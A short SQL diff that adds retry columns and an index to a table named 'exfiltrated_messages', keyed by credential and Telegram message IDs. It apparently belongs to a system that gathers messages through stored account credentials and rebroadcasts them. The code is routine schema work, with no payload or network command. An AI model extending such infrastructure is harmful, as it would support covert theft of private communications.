@@ -75,6 +75,9 @@ CREATE TABLE IF NOT EXISTS exfiltrated_messages (
     file_meta            JSONB       DEFAULT '{}'::jsonb,
     is_broadcasted       BOOLEAN     DEFAULT FALSE,
     broadcast_claimed_at TIMESTAMPTZ DEFAULT NULL,             -- distributed claim lock
+    broadcast_error      JSONB       DEFAULT NULL,             -- last send failure classification
+    broadcast_attempts   INT         DEFAULT 0,
+    next_retry_at        TIMESTAMPTZ DEFAULT NULL,
     created_at           TIMESTAMPTZ DEFAULT NOW(),
     CONSTRAINT unique_msg_per_credential UNIQUE (credential_id, telegram_msg_id)
 );
@@ -88,6 +91,10 @@ CREATE INDEX IF NOT EXISTS idx_messages_is_broadcasted
 
 CREATE INDEX IF NOT EXISTS idx_messages_claimed
     ON exfiltrated_messages(is_broadcasted, broadcast_claimed_at);
+
+CREATE INDEX IF NOT EXISTS idx_messages_next_retry
+    ON exfiltrated_messages(is_broadcasted, next_retry_at)
+    WHERE is_broadcasted = FALSE;
 
 
 -- ============================================================
